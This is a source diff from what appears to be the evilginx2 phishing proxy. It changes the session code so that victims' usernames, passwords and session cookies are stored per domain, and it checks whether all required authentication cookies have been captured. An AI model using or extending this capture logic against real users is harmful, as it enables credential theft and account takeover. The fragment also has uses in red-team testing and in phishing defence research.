@@ -1,13 +1,15 @@
 package core
 
-import ()
+import (
+	"github.com/kgretzky/evilginx2/database"
+)
 
 type Session struct {
 	Id          string
 	Name        string
 	Username    string
 	Password    string
-	Tokens      map[string]string
+	Tokens      map[string]map[string]*database.Token
 	RedirectURL string
 	IsDone      bool
 }
@@ -21,7 +23,7 @@ func NewSession(name string) (*Session, error) {
 		RedirectURL: "",
 		IsDone:      false,
 	}
-	s.Tokens = make(map[string]string)
+	s.Tokens = make(map[string]map[string]*database.Token)
 
 	return s, nil
 }
@@ -34,18 +36,55 @@ func (s *Session) SetPassword(password string) {
 	s.Password = password
 }
 
-func (s *Session) AddAuthToken(key string, value string, req_keys []string) bool {
-	s.Tokens[key] = value
+func (s *Session) AddAuthToken(domain string, key string, value string, path string, http_only bool, authTokens map[string][]*AuthToken) bool {
+	if _, ok := s.Tokens[domain]; !ok {
+		s.Tokens[domain] = make(map[string]*database.Token)
+	}
+	if tk, ok := s.Tokens[domain][key]; ok {
+		tk.Name = key
+		tk.Value = value
+		tk.Path = path
+		tk.HttpOnly = http_only
+	} else {
+		s.Tokens[domain][key] = &database.Token{
+			Name:     key,
+			Value:    value,
+			HttpOnly: http_only,
+		}
+	}
 
-	if len(req_keys) > 0 {
-		var tkeys []string
-		tkeys = append(tkeys, req_keys...)
-		for k, _ := range s.Tokens {
-			tkeys = removeString(k, tkeys)
+	tcopy := make(map[string][]AuthToken)
+	for k, v := range authTokens {
+		tcopy[k] = []AuthToken{}
+		for _, at := range v {
+			tcopy[k] = append(tcopy[k], *at)
 		}
-		if len(tkeys) == 0 {
-			return true
+	}
+
+	for domain, tokens := range s.Tokens {
+		for tk, _ := range tokens {
+			if al, ok := tcopy[domain]; ok {
+				for an, at := range al {
+					match := false
+					if at.re != nil {
+						match = at.re.MatchString(tk)
+					} else if at.name == tk {
+						match = true
+					}
+					if match {
+						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
+						if len(tcopy[domain]) == 0 {
+							delete(tcopy, domain)
+						}
+						break
+					}
+				}
+			}
 		}
+	}
+
+	if len(tcopy) == 0 {
+		return true
 	}
 	return false
 }
